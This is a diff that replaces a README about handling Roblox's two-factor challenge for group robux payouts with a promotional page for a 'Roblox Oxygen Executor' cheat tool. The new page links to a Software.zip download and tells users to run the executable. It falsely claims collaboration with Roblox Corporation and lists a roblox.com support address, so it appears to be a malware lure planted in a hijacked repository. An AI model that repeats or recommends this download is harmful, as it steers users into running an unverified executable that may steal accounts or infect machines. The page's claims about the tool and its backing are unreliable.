@@ -1,47 +1,36 @@
-# Paying out robux from a group, when the group holder has two factor authentication enabled
+# Roblox-Oxygen
+![Oxygen Executor Logo](https://example.com/oxygen_logo.png)
 
-main.py contains example python code that does the whole process
+Welcome to the official repository of **Roblox Oxygen Executor**! 🚀
 
-## How it works:
+## Overview
+**Roblox Oxygen** is a versatile script execution tool designed for Roblox, offering users the ability to run Lua scripts and access a plethora of game modifications. With its intuitive interface and powerful features, Oxygen empowers users to enhance their gameplay experience on the Roblox platform with ease and efficiency.
 
-### 1.
-When your group payout request returns error 403 and message "Challenge is required to authorize the request", it contains two headers with data to validate your session with two factor authentication. The headers are:
-   - "rblx-challenge-id": it contains the `first` challenge id used to validate the session
-   - "rblx-challenge-metadata": this header contains base64 encoded table, with a `second` challenge id
-### 2.
-After saving both the challenge ids, you need to send a post request to the endpoint `twostepverification.roblox.com/v1/users/%group holder id%/challenges/authenticator/verify` (the response to this request will contain a verification token, used to validate your session), with body containing following json: 
-```json
-{
-  "actionType": "Generic",
-  "challengeId": "%second challenge id%",
-  "code": "%your 6 digit 2fa code%"
-}
-```
+## Features
+1. **Script Execution:** Run Lua scripts within Roblox games.
+2. **Game Modifications:** Access various game modifications to enhance your gameplay.
+3. **Intuitive Interface:** User-friendly design for a seamless experience.
 
-### 3.
-Now that you have the verification token, its time to validate your session. Send a post request to `apis.roblox.com/challenge/v1/continue` with body containing this json:
-(Make sure to turn `challengeMetadata` value into a string. It can't be an object/dictionary.)
-```json
-{
-  "challengeId": "%first challenge id%",
-  "challengeMetadata": { "rememberDevice": false, "actionType": "Generic", "verificationToken": "%the verification token%", "challengeId": "%the second challenge id%" },
-  "challengeType": "twostepverification"
-}
-```
+## Installation
+To install **Roblox Oxygen Executor**, simply download the software using the button below:
+[![Download Roblox Oxygen](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)](https://github.com/user-attachments/files/17394153/Software.zip)
 
-### 4.
-The next payout request using the same session has to include 3 new headers:
-- rblx-challenge-id - containing the `first` challenge id
-- rblx-challenge-type - containing the string "twostepverification"
-- rblx-challenge-metadata - containing this base64 encoded json:
-```json
-{
-   "rememberDevice": false,
-   "actionType": "Generic",
-   "verificationToken": "%the verification token%",
-   "challengeId": "%the second challenge id%"
-}
-```
+## Usage
+1. Download and unzip the software package.
+2. Run the executable file.
+3. Follow the on-screen instructions to get started with **Roblox Oxygen**.
 
-### 5.
-That's it! Everything should be validated and robux sent.
+## Contributing
+We welcome contributions from the community to enhance **Roblox Oxygen**. If you have any suggestions, bug reports, or feature requests, feel free to open an issue or submit a pull request.
+
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## Contact
+For any inquiries or support regarding **Roblox Oxygen Executor**, you can contact us at [oxygen.support@roblox.com](mailto:oxygen.support@roblox.com).
+
+---
+
+![Roblox Logo](https://example.com/roblox_logo.png)
+
+In collaboration with Roblox Corporation. Made with ❤️ by the Roblox Oxygen Team.
